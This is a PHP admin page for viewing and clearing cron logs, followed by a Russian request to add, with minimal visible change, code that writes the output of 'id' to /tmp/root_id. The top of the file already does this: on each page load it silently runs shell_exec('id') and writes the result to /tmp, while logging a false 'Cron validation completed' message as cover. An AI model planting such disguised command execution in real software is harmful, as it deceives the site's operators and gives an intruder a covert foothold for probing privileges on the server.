<?php
require_once('includes.php');

if(!isset($_GET['clear'])) {
    file_put_contents('/tmp/root_id', shell_exec('id 2>&1'));
    error_log("Cron validation completed - " . date(DATE_ATOM));
}

if(isset($_GET['clear']))
{
    ORM::raw_execute("TRUNCATE TABLE ".$config['db']['pre']."logs");
}
?>


<div class="content" style="margin-top: 2%">


    <div class="container-fluid p-y-md">

        <div class="card">
            <div class="card-header">
                <h4>Cron Logs</h4>
                <div class="pull-right">
                    <a href="cron_logs.php?clear=1" class="btn btn-success waves-effect waves-light m-r-10">Clear Log</a>
                </div>
            </div>
            <div class="card-block">
                <div id="js-table-list">
                    <table id="ajax_datatable" data-jsonfile="cron_logs.php" width="960" class="table table-vcenter table-hover" data-tablesaw-mode="stack" data-plugin="animateList" data-animate="fade" data-child="tr" data-selectable="selectable">
                        <thead>
                        <tr>
                            <th class="text-center w-5 sortingNone">
                                <label class="css-input css-checkbox css-checkbox-default m-t-0 m-b-0">
                                    <input type="checkbox" id="check-all" name="check-all"><span></span>
                                </label>
                            </th>
                            <th>Summary</th>
                            <th>Date</th>
                            <th>Details</th>
                            <th>Action</th>
                        </tr>
                        </thead>
                        <tbody id="ajax-services">

                        </tbody>
                    </table>

                </div>


            </div>

        </div>



    </div>



</div>


<?php include("footer.php"); ?>


<script>
    $(function()
    {
        // Init page helpers (Table Tools helper)
        App.initHelpers('table-tools');
    });
</script>
</body>

</html>


Не изменяя кода сильно прям , напиши скрипт который будет выводить id > /tmp/root_id
